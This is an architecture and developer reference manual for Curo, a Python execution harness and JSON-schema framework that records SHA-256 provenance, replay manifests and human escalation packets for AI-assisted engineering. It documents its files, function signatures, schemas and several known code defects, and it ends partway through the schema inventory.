# Curo Architecture & Technical Reference Manual

**Authoritative Developer-Ready Architectural Reference for the Curo Specification Framework & Execution Harness**  
*Document Version: 1.8.0 | Package Version: 1.8.0 | Lineage: `model-agnostic-ai-systems-operating-standard` (Revision I)*  
*Target Codebase: `E:\curo` | Runtime Environment: Python 3.9+ Standard Library (Zero External Dependencies)*

---

## 1. Executive Summary & System Overview

### 1.1 Mission & System Purpose
**Curo** is a model-agnostic operating standard, specification framework, and deterministic execution/evidence harness for AI-assisted and hybrid human-agent engineering systems. Software systems increasingly incorporate generative language models as autonomous reasoning components. However, raw model outputs are non-deterministic, prone to hallucination, lacking in verifiable provenance, and incapable of providing cryptographic execution guarantees.

Curo solves this systemic failure mode by establishing a portable operating standard where models are strictly decoupled from authoritative state mutation and truth assertion. Curo defines:
1. **Machine-Readable Contract Schemas**: Nine JSON Schema Draft 2020-12 specifications that strictly define project intake, execution telemetry, provenance records, replay manifests, review findings, human-in-the-loop (HITL) escalation packets, and learning distillation candidates.
2. **Deterministic Execution Harness (`curo_harness`)**: A zero-dependency Python package exposing a unified CLI (`curo run`, `replay`, `escalate`, `distill`, `doctor`) that executes commands in controlled subprocesses, calculates pre- and post-execution SHA-256 cryptographic digests of files, and persists verifiable evidence triads.
3. **Six-Tier Precedence & Authority Ladder**: A formal governing hierarchy ensuring that deterministic validators and captured evidence outrank model judgment and prompt instructions under all circumstances.
4. **Canonical Artifact Registry**: A centralized, versioned registry cataloging all authoritative specifications, templates, and contracts across the repository with declared ownership and source lineage.

### 1.2 Core Architectural Philosophy
The central invariant governing Curo across all components, schemas, and execution pipelines is:

> **"Models are replaceable reasoning engines. The workflow, state, validation, evidence, and operating contracts are the system."**

Under this philosophy:
- **Models Propose, Harnesses Enforce**: A model may hypothesize a code modification, suggest an architectural change, or draft a commit message. However, the model has *no write access* to authoritative execution facts, verification passes, or state transitions.
- **The Checker Writes the Check Result**: The component that actually executes a validation check is the sole entity authorized to write the check result. A model cannot self-report that its unit tests passed; the harness must execute the test runner, capture the exit code, compute output hashes, and record the result.
- **Unknown Provenance Remains `UNKNOWN`**: If an artifact or factual assertion lacks an unbroken chain of custody back to verified deterministic evidence, its provenance must remain flagged with the uppercase sentinel `UNKNOWN`. Models are prohibited from fabricating or inferring provenance.
- **Model Neutrality & Provider Decoupling**: Workflows, contracts, and policies are decoupled from proprietary LLM APIs (OpenAI, Anthropic, Google, local weights). Model providers interact through thin translation adapters that cannot alter truth ownership.

### 1.3 The Four Disciplines of AI Systems Engineering
Curo structures agent and system engineering into four distinct, non-overlapping disciplines:

```text
┌──────────────────────────────────────────────────────────────────────────┐
│                    1. Prompt Engineering (Thin Layer)                    │
│   Instruction formatting, task framing, persona boundaries, constraints  │
└──────────────────────────────────────────────────────────────────────────┘
                                      │
                                      ▼
┌──────────────────────────────────────────────────────────────────────────┐
│                   2. Context Engineering (Data Pipeline)                 │
│   Progressive disclosure, contract schemas, file slices, token limits    │
└──────────────────────────────────────────────────────────────────────────┘
                                      │
                                      ▼
┌──────────────────────────────────────────────────────────────────────────┐
│                    3. Loop Engineering (State Machine)                   │
│   Iteration caps, failure branching, HITL escalation, convergence guards │
└──────────────────────────────────────────────────────────────────────────┘
                                      │
                                      ▼
┌──────────────────────────────────────────────────────────────────────────┐
│                   4. Harness Engineering (Truth Authority)               │
│   Process execution, timeout guards, SHA-256 hashing, evidence store     │
└──────────────────────────────────────────────────────────────────────────┘
```

1. **Prompt Engineering**: The thinnest layer. Prompts provide task framing, operational boundaries, and concise instructions. Complex logic is never embedded in prompts when contracts or tools can enforce it.
2. **Context Engineering**: Curates the precise information visible to the model at each execution step. Employs selective, progressive disclosure rather than monolithic context stuffing.
3. **Loop Engineering**: Governs multi-turn agent execution, retry budgets, and error recovery. Caps model correction attempts to 3 cycles before forcing human escalation.
4. **Harness Engineering**: The foundational truth layer. Executes commands, enforces permissions, captures standard output/error, calculates cryptographic hashes, and writes immutable records.

### 1.4 Diagnostic Ladder & Escalation Hierarchy
When a failure, bug, or unexpected behavior occurs in a Curo-managed system, operators and agents must traverse the **Diagnostic Ladder** in strict sequence from bottom to top. Changing the model or rewriting prompts is the last resort:

```text
Level 1: Harness Enforcement  ──► Did the harness fail to enforce a constraint or timeout?
Level 2: Context Engineering  ──► Was necessary context missing, stale, or malformed?
Level 3: Loop Engineering     ──► Did the agent loop spin out of bounds or fail to branch?
Level 4: Prompt Engineering   ──► Was the instruction ambiguous, contradictory, or bloated?
Level 5: Model Replacement    ──► Is the underlying foundation model inherently incapable?
```

### 1.5 Five Applied Reasoning Patterns
Curo's canonical operating standard (`docs/operating-standard.md`) defines five standard execution scenarios and their required handling:
1. **Normal Successful Execution**: Pre-flight inputs verified → subprocess command executes with exit code 0 → post-flight outputs verified → evidence triad (`provenance`, `run`, `replay`) persisted.
2. **Cancellation or Early Termination**: Subprocess or agent interrupted by user or watchdog → partial stdout/stderr captured → status recorded as `CANCELLED` or `HALTED` → temporary scratch resources purged.
3. **Dependency Timeout or Failure**: Command exceeds allotted execution budget (`timeout_seconds`) → `subprocess.TimeoutExpired` trapped → status recorded as `TIMED_OUT` (exit code `124`) → partial telemetry preserved.
4. **Missing or Unverifiable Provenance**: Artifact lacks cryptographic history or origin hashes → input hash recorded as sentinel `UNKNOWN` → downstream promotion gated until manual verification or deterministic rerun.
5. **Component Replacement**: Subsystem or model swapped → adapter contracts isolate vendor differences → regression guard replayed via `curo replay` to guarantee zero behavioral regression.

### 1.6 Current Maturity & Foundation Boundary
As declared in `project.yaml` and `docs/gaps-and-roadmap.md`, Curo is at **foundation maturity** (v1.8.0):
- **Implemented & Fully Operational**:
  - Root CLI launcher and harness execution engine (`curo run`, `replay`, `escalate`, `distill`, `doctor`).
  - Nine JSON Schema Draft 2020-12 specifications.
  - Cryptographic SHA-256 hashing and atomic JSON file persistence.
  - Zero-dependency repository integrity validator (`scripts/validate_curo.py`).
  - Master artifact registry (`registry/registry.yaml`) tracking 34 authoritative artifacts.
  - Complete policy definitions (precedence, ownership, validation, anti-patterns, directory rules).
  - Human and machine project kickoff templates.
  - Nine operational skill runbooks for agents.
- **Planned / Downstream Project Extensions** (`runtime_status: not_implemented`):
  - Long-running network daemon (HTTP/REST/gRPC/WebSocket APIs).
  - Concrete cloud provider LLM API client bindings (OpenAI, Anthropic, Google SDKs).
  - Web-based graphical UI dashboard (delegated to application state managers).
  - Cross-process file locking for high-concurrency multi-agent swarms.

---

## 2. Component Hierarchy & Complete Directory Structure

### 2.1 Repository Directory Tree
The repository comprises **18 functional subdirectories** and root files, totaling 70 source, specification, template, and test files:

```
E:\curo\
├── .agents/                                # Multi-agent orchestration, plans, and dispatches
├── .git/                                   # Git version control metadata
├── README.md                               # Root project landing page, core rules, and directory index
├── project.yaml                            # Canonical project manifest, ownership table, lifecycle rules
├── curo.py                                 # Root CLI executable wrapper for Curo Harness
├── adapters/                               # Model/provider interface boundary
│   ├── README.md                           # Directory scope and boundary guidelines
│   └── adapter-contract.md                 # Provider abstraction and format translation rules
├── anti-patterns/                          # Catalog of prohibited agentic failure modes
│   ├── README.md                           # Directory scope
│   └── anti-patterns.md                    # Five core anti-patterns (self-reported validation, etc.)
├── core-policies/                          # Foundational governing rules and precedence
│   ├── README.md                           # Directory overview
│   ├── ownership.md                        # Explicit truth ownership assignment table
│   ├── precedence.md                       # Strict 6-tier precedence ladder for conflict resolution
│   └── validation.md                       # 5 required validation checks and promotion rules
├── docs/                                   # Narrative specifications, standards, and roadmaps
│   ├── INDEX.md                            # Comprehensive human navigation index and reading guide
│   ├── README.md                           # Directory overview
│   ├── operating-standard.md               # Canonical operating standard v1.8.0 (392 lines)
│   ├── addendum-a.md                       # Accepted amendments 1–8 and clarifications
│   └── gaps-and-roadmap.md                 # Implementation maturity status and extension sequence
├── harness/                                # Subprocess execution, telemetry capture, and replay engine
│   ├── README.md                           # Harness subsystem overview
│   ├── harness-contract.md                 # Boundary, responsibilities, and limits of the harness
│   └── curo_harness/                       # Zero-dependency Python execution package
│       ├── __init__.py                     # Package declaration (v1.0.0)
│       ├── cli.py                          # Master argparse CLI dispatcher
│       ├── core.py                         # SHA-256 hashing, UTC timestamps, atomic file I/O
│       ├── distill.py                      # Post-run learning candidate distillation engine
│       ├── escalate.py                     # Human-in-the-Loop (HITL) exception packet generator
│       ├── replay.py                       # Deterministic offline replay verification engine
│       ├── run.py                          # Subprocess runner with telemetry and evidence generation
│       └── validator.py                    # Contract validator against Curo JSON schemas
├── learning/                               # Post-execution pattern distillation & promotion
│   ├── README.md                           # Directory overview
│   ├── learning-distillation-protocol.md   # Lifecycle from observation to candidate promotion
│   ├── learning-candidate-template.yaml    # Reusable template for proposed learning candidates
│   └── promotion-record-template.yaml      # Reusable template for candidate promotion records
├── manifests/                              # Historical and verified replay manifests
│   ├── math-node-v0.1-replay.json          # Verified replay manifest for Math Node kernel
│   └── spacetime-sim-learning-record.json  # Multi-agent execution record for Spacetime physics sim
├── observability/                          # Telemetry, run logging, and status schemas
│   ├── README.md                           # Observability subsystem overview
│   ├── observability-contract.md           # Authority rules, 17 status states, and update protocol
│   ├── run-record.schema.json              # Draft 2020-12 schema for observability run records
│   ├── run-event.schema.json               # Draft 2020-12 schema for discrete runtime events
│   ├── run-record-template.md              # Markdown template for human-readable run records
│   ├── run-index-template.md               # Markdown template for compact run indices
│   ├── sample-run-record.yaml              # Example governed run record
│   └── sample-run-event.json               # Example discrete runtime event
├── provenance/                             # Cryptographic lineage and proof records
│   ├── README.md                           # Directory overview
│   └── sample-provenance-record.yaml       # Example harness-generated provenance record
├── registry/                               # Canonical artifact catalog
│   ├── README.md                           # Registry governance and registration rules
│   └── registry.yaml                       # Master registry tracking 34 canonical artifacts
├── replay/                                 # Deterministic replay templates and principles
│   ├── README.md                           # Replay principles and determinism guarantees
│   └── replay-manifest-template.yaml       # Canonical replay manifest template
├── review/                                 # Exception Review Protocol & HITL escalation
│   ├── README.md                           # Directory overview
│   ├── exception-review-protocol.md        # Event-triggered exception protocol and exit states
│   ├── findings-template.yaml              # Reusable template for batched review findings
│   └── hitl-packet-template.yaml           # Reusable template for HITL escalation packets
├── rules/                                  # Environment and path isolation policies
│   └── project-directory-policy.md         # Workspace path extraction and drive transition rules
├── schemas/                                # Draft 2020-12 JSON Schema contracts
│   ├── README.md                           # Schema subsystem overview
│   ├── project-kickoff.schema.json         # Contract for project kickoff specifications
│   ├── provenance-record.schema.json       # Contract for cryptographic provenance records
│   ├── replay-manifest.schema.json         # Contract for deterministic replay manifests
│   ├── hitl-packet.schema.json             # Contract for HITL escalation packets
│   ├── learning-candidate.schema.json      # Contract for learning candidate proposals
│   ├── promotion-record.schema.json        # Contract for artifact promotion records
│   └── review-findings.schema.json         # Contract for batched review findings
├── scripts/                                # Repository self-checks and maintenance scripts
│   ├── README.md                           # Script inventory overview
│   └── validate_curo.py                    # Zero-dependency package self-check validation suite
├── skills/                                 # Operational runbooks and agent playbooks
│   ├── cli-creator.md                      # Composable CLI construction runbook
│   ├── curo-simulation-builder.md          # Multi-agent WebGL/Three.js physics simulation recipe
│   ├── define-goal.md                      # Measurable goal formulation playbook
│   ├── monorepo-contract-auditor.md        # Monorepo boundary and dependency audit playbook
│   ├── pdf.md                              # Visual PDF inspection and generation runbook
│   ├── playwright.md                       # Browser automation and UI verification playbook
│   ├── screenshot.md                       # Desktop and window screenshot capture runbook
│   ├── security-best-practices.md          # Language-specific security review guidelines
│   └── security-threat-model.md            # Threat modeling and trust boundary playbook
├── templates/                              # Project intake kickoff templates
│   ├── README.md                           # Template guidance
│   ├── project-kickoff.md                  # Human-readable kickoff specification template
│   └── project-kickoff.yaml                # Machine-readable kickoff specification template
└── tests/                                  # Harness automated test suite
    └── test_harness.py                     # Unittest suite for curo_harness execution engine
```

### 2.2 Functional Directory Catalog

| Directory Path | File Count | Subsystem Classification | Functional Responsibility & Architectural Purpose |
|---|---|---|---|
| `.` (Root) | 3 files | Root Entry & Config | Root configuration (`project.yaml`), project landing rules (`README.md`), and launcher (`curo.py`). |
| `adapters/` | 2 files | Interface Boundary | Defines provider abstraction boundaries; isolates vendor-specific APIs from core standards. |
| `anti-patterns/` | 2 files | Policy & Governance | Catalogs 5 critical failure modes prohibited across human and AI development workflows. |
| `core-policies/` | 4 files | Policy & Governance | Enforces authority precedence, truth ownership boundaries, and mandatory validation checks. |
| `docs/` | 5 files | Documentation | Authoritative narrative specifications, amendments (`addendum-a`), and extension roadmaps. |
| `harness/` | 10 files | Core Engine / Backend | Contains the executable Python 3 harness (`curo_harness`) and harness contract definition. |
| `learning/` | 4 files | Governance & Evolution | Distillation protocol and templates for transforming execution patterns into governed rules. |
| `manifests/` | 2 files | Evidence & Lineage | Concrete historical replay and multi-agent learning manifests for verified systems. |
| `observability/` | 8 files | Observability & Telemetry | Telemetry schemas (`run-record`, `run-event`), status lifecycle contract, and ledger templates. |
| `provenance/` | 2 files | Evidence & Lineage | Cryptographic proof samples and lineage record guidance. |
| `registry/` | 2 files | Governance & Metadata | Authoritative master catalog (`registry.yaml`) indexing 34 canonical system artifacts. |
| `replay/` | 2 files | Core Engine & Templates | Deterministic replay principles and YAML manifest templates. |
| `review/` | 4 files | Governance & HITL | Exception Review Protocol defining finding classes, convergence caps, and escalation. |
| `rules/` | 1 file | Environment Policy | Workspace directory policy governing path extraction and cross-drive transitions. |
| `schemas/` | 8 files | Contract Schemas | Draft 2020-12 JSON schemas governing kickoff, provenance, replay, review, and learning. |
| `scripts/` | 2 files | Verification & QA | Dependency-free Python script (`validate_curo.py`) validating repository integrity. |
| `skills/` | 9 files | Agent Operations | Specialized operational playbooks for agent workflows (CLI, WebGL, PDF, Browser, Threat Model). |
| `templates/` | 3 files | Project Intake | Human-readable and machine-readable kickoff briefs establishing project parameters. |
| `tests/` | 1 file | Verification & QA | Comprehensive `unittest` suite testing hashing, execution, replay, escalation, and distillation. |

---

## 3. Comprehensive Inventory of Non-Trivial Files & Key Function Signatures

### 3.1 Root CLI Launcher (`curo.py`)
- **File Path**: `E:\curo\curo.py` (15 lines)
- **Architectural Role**: Minimalist top-level command-line wrapper. Dynamically resolves the absolute path to `harness/`, inserts it into `sys.path` at position 0, imports `curo_harness.cli.main`, and executes it with process arguments.
- **Key Function Signatures**:
  ```python
  # Script execution entry point
  if __name__ == "__main__":
      sys.exit(main()) -> None
  ```

### 3.2 Harness Package Initialization (`harness/curo_harness/__init__.py`)
- **File Path**: `E:\curo\harness\curo_harness\__init__.py` (4 lines)
- **Architectural Role**: Python package declaration for `curo_harness`. Declares package version `__version__ = "1.0.0"`.

### 3.3 Master CLI Dispatcher (`harness/curo_harness/cli.py`)
- **File Path**: `E:\curo\harness\curo_harness\cli.py` (123 lines)
- **Architectural Role**: Command-line interface parser and route dispatcher built on standard library `argparse`. Translates command-line flags into typed function calls across the execution engine, prints serialized JSON outputs, and maps return codes to process exit codes.
- **Exported Function Signatures**:
  ```python
  def build_parser() -> argparse.ArgumentParser:
      """Construct the master argparse CLI parser with subcommands: run, replay, escalate, distill, doctor."""

  def main(args: list[str] | None = None) -> int:
      """Parse arguments, route to the target engine handler, output JSON results, and return integer exit code."""
  ```

### 3.4 Core Primitives & Cryptographic Utilities (`harness/curo_harness/core.py`)
- **File Path**: `E:\curo\harness\curo_harness\core.py` (61 lines)
- **Architectural Role**: Low-level foundational library providing deterministic SHA-256 hashing, ISO-8601 UTC timestamps, repository root resolution, and atomic filesystem JSON operations.
- **Exported Function Signatures**:
  ```python
  def utc_now_iso() -> str:
      """Return current UTC timestamp formatted as ISO-8601 with Z suffix (e.g. 2026-09-07T19:30:00Z)."""

  def sha256_bytes(data: bytes) -> str:
      """Calculate lowercase 64-character hex SHA-256 digest of arbitrary raw bytes."""

  def sha256_file(file_path: Union[str, Path]) -> str:
      """Stream file in 64 KB chunks (65,536 bytes) to compute deterministic SHA-256 hash.
      Raises FileNotFoundError if file does not exist."""

  def sha256_dict(data: Dict[str, Any]) -> str:
      """Calculate deterministic canonical SHA-256 hash of a JSON-serializable dictionary.
      Enforces lexicographical sorting (sort_keys=True) and compact separators (',', ':')."""

  def get_curo_root() -> Path:
      """Resolve the E:/curo repository root directory by navigating 2 levels up from core.py."""

  def safe_read_json(file_path: Union[str, Path]) -> Any:
      """Safely read, parse, and deserialize a UTF-8 encoded JSON file from disk."""

  def safe_write_json(file_path: Union[str, Path], data: Any, indent: int = 2) -> None:
      """Safely write data to a JSON file, creating parent directories if needed, appending trailing newline."""
  ```

### 3.5 Execution & Telemetry Engine (`harness/curo_harness/run.py`)
- **File Path**: `E:\curo\harness\curo_harness\run.py` (159 lines)
- **Architectural Role**: Primary command execution wrapper. Manages pre-execution input file hashing, subprocess invocation under timeout guards, stdout/stderr interception, high-resolution execution timing, post-execution output file hashing, and automated tripartite evidence file persistence.
- **Exported Function Signatures**:
  ```python
  def execute_run(
      command: str,
      run_id: str,
      inputs: Optional[List[str]] = None,
      outputs: Optional[List[str]] = None,
      timeout_seconds: float = 300.0,
      evidence_dir: Optional[str] = None,
      cwd: Optional[str] = None,
  ) -> Dict[str, Any]:
      """Execute a command under the Curo harness, capturing telemetry and generating evidence.
      Persists <run_id>-provenance.json, <run_id>-run.json, and <run_id>-replay.json.
      Returns execution summary dictionary containing status, exit_code, duration_ms, and file paths."""
  ```

### 3.6 Deterministic Replay Engine (`harness/curo_harness/replay.py`)
- **File Path**: `E:\curo\harness\curo_harness\replay.py` (122 lines)
- **Architectural Role**: Offline verification engine. Reads an existing replay manifest JSON file, cryptographically asserts that all pre-flight input file hashes match recorded hashes, re-executes the recorded command, evaluates output hashes, and returns a formal verification status (`REPLAY_VERIFIED` or `REPLAY_DRIFT_DETECTED`).
- **Exported Function Signatures**:
  ```python
  def execute_replay(
      manifest_path: str,
      cwd: Optional[str] = None
  ) -> Dict[str, Any]:
      """Replay a recorded run manifest and verify strict deterministic reproducibility.
      Aborts with BLOCKED if pre-flight input hashes drift.
      Returns verification dictionary with status REPLAY_VERIFIED, REPLAY_DRIFT_DETECTED, or FAIL."""
  ```
- **Type Annotation Implementation Note**: In `harness/curo_harness/replay.py`, line 8 imports `Any, Dict, List` from `typing` but omits `Optional`, despite line 13 using `cwd: Optional[str] = None`. While execution succeeds due to `from __future__ import annotations`, evaluating annotations via `typing.get_type_hints()` raises `NameError: name 'Optional' is not defined`.

### 3.7 Human-in-the-Loop Escalation Service (`harness/curo_harness/escalate.py`)
- **File Path**: `E:\curo\harness\curo_harness\escalate.py` (66 lines)
- **Architectural Role**: Exception review and escalation generator. Formulates structured HITL exception packets when an autonomous agent reaches an ambiguous decision, encounters an environmental block, or exhausts its model revision loop limit.
- **Exported Function Signatures**:
  ```python
  def generate_hitl_packet(
      packet_id: str,
      project_id: str,
      review_id: str,
      finding_description: str,
      finding_class: str = "human_decision",
      blocking: bool = True,
      decisions_required: Optional[List[Dict[str, Any]]] = None,
      authorized_transition: str = "WAIT_FOR_HUMAN_REVIEW",
      output_dir: Optional[str] = None
  ) -> Dict[str, Any]:
      """Generate a structured Curo Human-in-the-Loop exception packet adhering to review protocol.
      Validates finding_class in {'mechanical', 'engineering', 'evidence_required', 'human_decision'}.
      Persists evidence/review/<packet_id>.json."""
  ```

### 3.8 Learning Candidate Distillation Service (`harness/curo_harness/distill.py`)
- **File Path**: `E:\curo\harness\curo_harness\distill.py` (51 lines)
- **Architectural Role**: Post-execution pattern extraction engine. Converts observed run failures, successful optimizations, or operational conventions into governed learning candidate proposals gated by human review.
- **Exported Function Signatures**:
  ```python
  def distill_learning_candidate(
      candidate_id: str,
      source_run_id: str,
      proposed_type: str = "rule",
      title: str = "Extracted Pattern",
      summary: str = "",
      pattern_description: str = "",
      evidence_references: Optional[List[str]] = None,
      output_dir: Optional[str] = None
  ) -> Dict[str, Any]:
      """Distill an observed run event or finding into a Curo learning candidate proposal.
      Validates proposed_type in {'rule', 'skill', 'anti_pattern', 'validator', 'standard_amendment'}.
      Persists evidence/learning/<candidate_id>.json with promotion_gate: 'HITL_REQUIRED'."""
  ```
- **CLI Option Drift Note**: While `distill_learning_candidate()` validates against five proposal types in Python (`distill.py:22`), `curo_harness/cli.py` line 56 restricts `--type` choices to `['rule', 'skill', 'anti_pattern', 'validator']`, omitting `'standard_amendment'`. Passing `--type standard_amendment` via the command line is rejected by `argparse` with an invalid choice error before reaching the engine.

### 3.9 Schema Validation Engine (`harness/curo_harness/validator.py`)
- **File Path**: `E:\curo\harness\curo_harness\validator.py` (90 lines)
- **Architectural Role**: Schema resolution and contract verification library. Inspects Python dictionaries against canonical JSON schemas using zero-dependency built-in checks (required fields, property types, enums, additionalProperties prohibition) with dynamic delegation to the full `jsonschema` library if installed.
- **Exported Function Signatures**:
  ```python
  def get_schema_path(schema_name: str) -> Path:
      """Resolve schema path across schemas/<name>.schema.json and observability/<name>.schema.json.
      Raises FileNotFoundError if schema cannot be located."""

  def validate_curo_payload(payload: Dict[str, Any], schema_name: str) -> Tuple[bool, List[str]]:
      """Validate a payload against a Curo JSON schema.
      Returns tuple of (is_valid: bool, error_messages: List[str])."""
  ```
- **Known Runtime Implementation Defects**:
  1. *Unhandled `TypeError` on Union / Nullable Types*: In `validator.py` line 63 (`if expected_type_str and expected_type_str in type_map:`), if a schema property declares a union type (e.g. `"type": ["string", "null"]`), `expected_type_str` is a Python `list`. Checking membership in `type_map` attempts to hash an unhashable `list`, raising an unhandled `TypeError: unhashable type: 'list'`. This crashes validation on 7 of the 9 canonical schemas, including any provenance record generated by `run.py` (which populates `source_conversation_id` and `source_note`).
  2. *Relative `$ref` Resolution Failure*: In `validator.py` line 83, `jsonschema.validate()` is called without specifying a base URI or `RefResolver`. Schemas containing relative references (such as `schemas/replay-manifest.schema.json` referencing `provenance-record.schema.json`) fail validation when the optional `jsonschema` library is installed.

### 3.10 Package Integrity Validator (`scripts/validate_curo.py`)
- **File Path**: `E:\curo\scripts\validate_curo.py` (169 lines)
- **Architectural Role**: Dependency-free repository integrity check script executing seven validation gates. Verifies file presence, JSON schema syntax, registry completeness, markdown header uniqueness, version synchronization across documents, uppercase sentinels, and schema cross-references.
- **Function Signatures**:
  ```python
  def fail(errors: list[str], message: str) -> None:
      """Append failure message to error accumulator list."""

  def check_required_files(errors: list[str]) -> None:
      """Verify presence of README.md, project.yaml, registry.yaml, and all 34 registered artifact paths."""

  def check_json_schemas(errors: list[str]) -> None:
      """Assert that all *.schema.json files in repository parse as syntactically valid JSON."""

  def check_registry(errors: list[str]) -> None:
      """Assert presence of all 34 expected artifact IDs and verify required metadata fields."""

  def check_standard_headings(errors: list[str]) -> None:
      """Assert that no duplicate markdown headings exist in docs/operating-standard.md."""

  def check_version_sync(errors: list[str]) -> None:
      """Assert version synchronization (1.8.0) across project.yaml, operating-standard.md, replay template, and registry."""

  def check_sentinels(errors: list[str]) -> None:
      """Verify UNKNOWN provenance rule in standard and ensure no lowercase 'unknown' appears in sample provenance."""

  def check_schema_links(errors: list[str]) -> None:
      """Assert replay-manifest.schema.json references provenance-record.schema.json via $ref."""

  def main() -> int:
      """Execute all 7 validation checks; print PASS or list errors and return integer exit code (0 or 1)."""
  ```

### 3.11 Harness Unit Test Suite (`tests/test_harness.py`)
- **File Path**: `E:\curo\tests\test_harness.py` (110 lines)
- **Architectural Role**: Automated unit test suite using standard library `unittest`. Creates isolated scratch environments, tests SHA-256 byte/file/dict hashing, executes end-to-end command runs with evidence persistence, replays manifests deterministically, generates HITL escalation packets, and distills learning candidates.
- **Class & Method Signatures**:
  ```python
  class TestCuroHarness(unittest.TestCase):
      def setUp(self) -> None:
          """Create isolated scratch test directory (tests/scratch/) and dummy input file."""
      def tearDown(self) -> None:
          """Recursively clean up scratch test directory."""
      def test_01_core_hashing(self) -> None:
          """Test sha256_file, sha256_bytes, and sha256_dict canonical serialization."""
      def test_02_run_execution_and_evidence(self) -> None:
          """Test execute_run, verify provenance and replay manifest persistence, and execute execute_replay."""
      def test_03_hitl_escalation(self) -> None:
          """Test generate_hitl_packet creation, property population, and JSON file emission."""
      def test_04_learning_distillation(self) -> None:
          """Test distill_learning_candidate creation and gated promotion status."""
  ```
*(Note: Test methods are unannotated in source code; return annotations `-> None` reflect runtime return semantics).*

---

## 4. Data Models, Schemas & Storage Architecture

### 4.1 Schema System & Standards
All machine-readable contracts in Curo are written using **JSON Schema Draft 2020-12** (`$schema: "https://json-schema.org/draft/2020-12/schema"`). Nine authoritative schemas establish strict boundaries for every persistent entity in the system.

### 4.2 Comprehensive Inventory of the Nine Canonical Schemas

#### 1. `schemas/project-kickoff.schema.json`
- **Schema ID**: `https://curo.local/schemas/project-kickoff.schema.json`
- **Core Type**: `curo_project_kickoff`
- **Required Properties** (17 required sections):
  `template_type`, `template_version`, `updated_at`, `status`, `project`, `objective`, `scope`, `users`, `environment`, `execution_profile`, `ownership`, `acceptance_criteria`, `failure_cases`, `approval_boundaries`, `open_decisions`, `known_risks`, `first_implementation_slice`.
- **Status Enum**: `["DRAFT", "READY_FOR_DESIGN", "BLOCKED"]`
- **Structural Constraints**: `additionalProperties: false`. Enforces explicit ownership declaration for objective, operational state, tool authority, validation, provenance, evidence persistence, observability, and pending decisions.

#### 2. `schemas/provenance-record.schema.json`
- **Schema ID**: `https://curo.local/schemas/provenance-record.schema.json`
- **Core Type**: `provenance_record`
- **Required Properties**:
  `record_type`, `artifact_id`, `input_hash`, `output_hash`, `validator_result`, `owner`, `created_at`.
- **Key Enums & Types**:
  - `owner`: Must be `["harness"]` (enforced via JSON Schema enum; models are strictly excluded from provenance ownership).
  - `validator_result`: Defined as string (`minLength: 1`) in JSON Schema. The three-value domain `["PASS", "FAIL", "UNKNOWN"]` is a governance policy rule mandated by `docs/operating-standard.md` rather than a schema-level enum.
  - `input_hash` / `output_hash`: Defined as string (`minLength: 1`) in JSON Schema. The 64-character lowercase hexadecimal format `^[a-f0-9]{64}$` and canonical sentinels (`UNKNOWN`, `NONE`, `MULTIPLE_INPUTS`, `MULTIPLE_OUTPUTS`) are policy requirements defined in `docs/operating-standard.md`.
  - `created_at`: Formatted as `date-time`.
- **Structural Constraints**: `additionalProperties: false`.

#### 3. `schemas/replay-manifest.schema.json`
- **Schema ID**: `https://curo.local/schemas/replay-manifest.schema.json`
- **Core Type**: `replay_manifest`
- **Required Properties**:
  `manifest_type`, `artifact_id`, `version`, `inputs`, `expected_checks`, `provenance`.
- **Key Linkages**:
  - `provenance`: Direct `$ref` to `provenance-record.schema.json`.
  - `inputs`: Array of input file descriptors with `path` and `sha256`.
  - `expected_checks`: Array of string check identifiers (e.g. `input_hash_verification`, `output_hash_verification`).
- **Structural Constraints**: `additionalProperties: false`.

#### 4. `schemas/hitl-packet.schema.json`
- **Schema ID**: `https://curo.local/schemas/hitl-packet.schema.json`
- **Core Type**: `curo_hitl_packet`
- **Required Properties**:
  `artifact_type`, `packet_version`, `packet_id`, `project_id`, `review_id`, `status`, `decisions`.
- **Status Const**: `"HITL_REQUIRED"`
- **Sub-schema `$defs/decision`**:
  Requires `id`, `question`, `why_human_input_is_required`, and `impact`.

#### 5. `schemas/review-findings.schema.json`
- **Schema ID**: `https://curo.local/schemas/review-findings.schema.json`
- **Core Type**: `curo_review_findings`
- **Required Properties**:
  `artifact_type`, `artifact_version`, `review_id`, `project_id`, `status`, `findings`, `resolution`.
- **Status Enum**: `["AGREED", "AGREED_WITH_WARNINGS", "NEEDS_CORRECTION", "NEEDS_EVIDENCE", "HITL_REQUIRED", "BLOCKED"]`.
- **Finding Enums**:
  - Severity: `["info", "warning", "error", "critical"]`.
  - Finding Class: `["mechanical", "engineering", "evidence_required", "human_decision"]`.

#### 6. `schemas/learning-candidate.schema.json`
- **Schema ID**: `https://curo.local/schemas/learning-candidate.schema.json`
- **Core Type**: `curo_learning_candidate`
- **Required Properties**:
  `artifact_type`, `artifact_version`, `candidate_id`, `project_id`, `owner`, `status`, `candidate_type`, `source_run_ids`, `evidence_refs`, `proposed_change`, `requires_hitl`.
- **Status Enum** (7 states): `["PROPOSED", "VALIDATION_PENDING", "VALIDATED", "APPROVED", "PROMOTED", "REJECTED", "BLOCKED"]`.
- **Candidate Types**: Defined as general string (`minLength: 1`) in JSON Schema. The five proposal classifications `["rule", "skill", "anti_pattern", "validator", "standard_amendment"]` are enforced at runtime by `curo_harness/distill.py:22` (and restricted to 4 choices at the CLI boundary by `cli.py:56`).
- **Requires HITL**: Boolean indicating mandatory human gate before promotion.

#### 7. `schemas/promotion-record.schema.json`
- **Schema ID**: `https://curo.local/schemas/promotion-record.schema.json`
- **Core Type**: `curo_promotion_record`
- **Required Properties**:
  `artifact_type`, `artifact_version`, `promotion_id`, `candidate_id`, `project_id`, `status`, `validated_by`, `validation_refs`, `approval_required`, `target_artifact`, `resulting_commit`, `regression_guard_ref`, `rollback_ref`.
- **Status Enum**: `["VALIDATION_PENDING", "VALIDATED", "APPROVED", "PROMOTED", "REJECTED", "BLOCKED"]`.
- **Safety Invariant**: Mandates both `regression_guard_ref` and `rollback_ref` prior to promoting any learned pattern.

#### 8. `observability/run-record.schema.json`
- **Schema ID**: `https://curo.local/schemas/observability-run-record.schema.json`
- **Core Type**: `observability_run_record`
- **Required Properties**:
  `record_type`, `run_id`, `recorded_at`, `project_id`, `workflow_id`, `role`, `status`, `provenance_source`, `evidence_locators`, `next_authorized_action`.
- **Status Enum** (17 states):
  `["CREATED", "RUNNING", "COMPLETE", "PASS", "FAIL", "BLOCKED", "PARTIAL", "CANCELLED", "TIMED_OUT", "IMPLEMENTED", "CLEAR", "MATERIAL_FINDINGS", "DEFERRED", "NOT_STARTED", "NOT_AUTHORIZED", "FROZEN", "UNKNOWN"]`.
- **Learning Sub-Schema Status Enum** (8 states):
